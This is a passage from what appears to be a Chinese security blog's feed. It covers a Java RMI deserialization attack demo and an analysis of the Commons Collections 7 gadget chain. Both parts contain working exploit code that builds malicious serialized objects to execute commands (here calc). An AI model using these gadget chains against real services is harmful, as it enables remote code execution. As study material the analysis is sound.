function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>, <span class="number">1099</span>);<span class="comment">//获取远程主机对象</span></span><br><span class="line">        <span class="type">RMIInterface</span> <span class="variable">rmiInterface</span> <span class="operator">=</span> (RMIInterface) registry.lookup(<span class="string">&quot;rmiService&quot;</span>);<span class="comment">//利用注册表的代理去查询远程注册表中名为rmiService的对象</span></span><br><span class="line">        System.out.println(rmiInterface.sayHello());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果远程的这个方法有参数的话，调用该方法传入的参数必须是可序列化的。在传输中是传输序列化后的数据，服务端会对客户端的输入进行反序列化。客户端运行结果如下：</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220616215129160-771244566.png" alt="image-20220616215127966"></p><h3 id="RMI攻击"><a href="#RMI攻击" class="headerlink" title="RMI攻击"></a>RMI攻击</h3><p>使用RMI反序列化攻击需要两个条件：第一个是接收Object类型的参数，第二就是RMI服务端存在命令执行的利用链。</p><p>远程接口的代码，需要定义一个Object类型的参数方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ljw.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">User</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(String hello)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">work</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">void</span>  <span class="title function_">say</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>远程接口实现类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ljw.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RMIClientSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RMIServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserImpl</span>  <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(String hello)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;say&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;say&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">work</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;work被调用了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">say</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;say被调用了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">UserImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">UserImpl</span><span class="params">(<span class="type">int</span> port)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="built_in">super</span>(port);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">UserImpl</span><span class="params">(<span class="type">int</span> port, RMIClientSocketFactory csf, RMIServerSocketFactory ssf)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="built_in">super</span>(port, csf, ssf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>服务端代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ljw.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="comment">//RMIInterface rmiService = new RMIServiceImpl();//创建远程对象</span></span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserImpl</span>();</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);<span class="comment">//创建注册表</span></span><br><span class="line">        registry.bind(<span class="string">&quot;user&quot;</span>, user);<span class="comment">//将远程对象绑定到注册表里，并且设置为rmiService</span></span><br><span class="line">        System.out.println(<span class="string">&quot;rmi running....&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>客户端代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ljw.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException, MalformedURLException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line"><span class="comment">//        Registry registry = LocateRegistry.getRegistry(&quot;localhost&quot;, 1099);//获取远程主机对象</span></span><br><span class="line"><span class="comment">//        RMIInterface rmiInterface = (RMIInterface) registry.lookup(&quot;rmiService&quot;);//利用注册表的代理去查询远程注册表中名为rmiService的对象</span></span><br><span class="line"><span class="comment">//        System.out.println(rmiInterface.sayHello());</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;rmi://127.0.0.1:1099/user&quot;</span>;</span><br><span class="line">        <span class="type">User</span> <span class="variable">User</span> <span class="operator">=</span> (User) Naming.lookup(url);</span><br><span class="line">        User.work(getPayload());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getPayload</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchMethodException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        org.apache.commons.collections.Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">org</span>.apache.commons.collections.Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">ctor</span> <span class="operator">=</span> cl.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> ctor.newInstance(Retention.class, transformedMap);</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>客户端运行结果</p><p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220616222718778-410745754.png" alt="image-20220616222718134"></p><p>之所以会弹出计算器，前面有提到过RMI在传输数据的时候，会被序列化，传输的是序列化后的数据，在传输完成后再进行反序列化。那么这时候如果传输一个恶意的序列化数据就会进行反序列化的命令执行。</p><h3 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h3><p>对RMI做了简单的了解和使用，后续会对RMI的底层进行分析…</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/nice0e3/p/13927460.html">https://www.cnblogs.com/nice0e3/p/13927460.html</a></p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h3 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; title=&quot;概念&quot;&gt;&lt;/a&gt;概念&lt;/h3&gt;&lt;p&gt; Java远程方法调用，即Java RMI（Java Remote Method Invocation）是Java编程语言里，一种用于实现远程过程调用的应用程序编程接口。它使客户机上运行的程序可以调用远程服务器上的对象。远程方法调用特性使Java编程人员能够在网络环境中分布操作。RMI全部的宗旨就是尽可能简化远程接口对象的使用。&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="https://kpa1on.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="RMI" scheme="https://kpa1on.github.io/tags/RMI/"/>
    
  </entry>
  
  <entry>
    <title>Java安全之Commons Collections7分析</title>
    <link href="https://kpa1on.github.io/2022/06/05/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections7%E5%88%86%E6%9E%90/"/>
    <id>https://kpa1on.github.io/2022/06/05/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections7%E5%88%86%E6%9E%90/</id>
    <published>2022-06-05T02:37:44.000Z</published>
    <updated>2022-06-05T05:17:20.298Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>该链和CC6类似，不过CC7利用链中是使用<code>Hashtable</code>作为反序列化的入口点。</p><span id="more"></span><h3 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Hashtable.readObject</span><br><span class="line">Hashtable.reconstitutionPut</span><br><span class="line">Hashtable.reconstitutionPut</span><br><span class="line">  LazyMap.equals 没实现，找父类</span><br><span class="line">     AbstractMapDecorator.equals</span><br><span class="line">        HashMap.equals 没实现，找父类</span><br><span class="line">           AbstractMap.equals</span><br><span class="line">              LazyMap.get</span><br><span class="line">   ChainedTransformer.transform()</span><br><span class="line">        ConstantTransformer.transform()</span><br><span class="line"> InvokerTransformer.transform()</span><br></pre></td></tr></table></figure><h3 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cc7;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC7</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Reusing transformer chain and LazyMap gadgets from previous payloads</span></span><br><span class="line">        <span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        execArgs),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.decorate(innerMap1, transformerChain);</span><br><span class="line">        lazyMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.decorate(innerMap2, transformerChain);</span><br><span class="line">        lazyMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Use the colliding Maps as keys in Hashtable</span></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">iTransformers</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        iTransformers.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        iTransformers.set(transformerChain,transformers);</span><br><span class="line"><span class="comment">//        Reflections.setFieldValue(transformerChain, &quot;iTransformers&quot;, transformers);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Needed to ensure hash collision after previous manipulations</span></span><br><span class="line">        lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test1.out&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(hashtable);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test1.out&quot;</span>));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line"><span class="comment">//            return hashtable;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先看下<code>Hashtable</code>序列化过程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"><span class="comment">//临时变量（栈）</span></span><br><span class="line">      Entry&lt;Object, Object&gt; entryStack = <span class="literal">null</span>;</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">          s.defaultWriteObject();</span><br><span class="line"> </span><br><span class="line"><span class="comment">//写入table的容量</span></span><br><span class="line">          s.writeInt(table.length);</span><br><span class="line"><span class="comment">//写入table的元素个数</span></span><br><span class="line">          s.writeInt(count);</span><br><span class="line"> </span><br><span class="line">          <span class="comment">//取出table中的元素，放入栈中（entryStack）</span></span><br><span class="line">          <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>; index &lt; table.length; index++) &#123;</span><br><span class="line">              Entry&lt;?,?&gt; entry = table[index];</span><br><span class="line"> </span><br><span class="line">              <span class="keyword">while</span> (entry != <span class="literal">null</span>) &#123;</span><br><span class="line">                  entryStack =</span><br><span class="line">                      <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(<span class="number">0</span>, entry.key, entry.value, entryStack);</span><br><span class="line">                  entry = entry.next;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="comment">//依次写入栈中的每个元素</span></span><br><span class="line">      <span class="keyword">while</span> (entryStack != <span class="literal">null</span>) &#123;</span><br><span class="line">          s.writeObject(entryStack.key);</span><br><span class="line">          s.writeObject(entryStack.value);</span><br><span class="line">          entryStack = entryStack.next;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>Hashtable有一个Entry<?,?>[]类型的table属性，用于存放元素（键值对）。Hashtable在序列化时会先把table数组的容量和table数组中的元素个数写入到序列化流中，然后将table数组中的元素取出写入到序列化流中。</p><p>再来看Hashtable的反序列化流程：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">       <span class="comment">// Read in the length, threshold, and loadfactor</span></span><br><span class="line">       s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 读取table数组的容量</span></span><br><span class="line">       <span class="type">int</span> <span class="variable">origlength</span> <span class="operator">=</span> s.readInt();</span><br><span class="line"><span class="comment">//读取table数组的元素个数</span></span><br><span class="line">       <span class="type">int</span> <span class="variable">elements</span> <span class="operator">=</span> s.readInt();</span><br><span class="line"></span><br><span class="line"><span class="comment">//计算table数组的length</span></span><br><span class="line">       <span 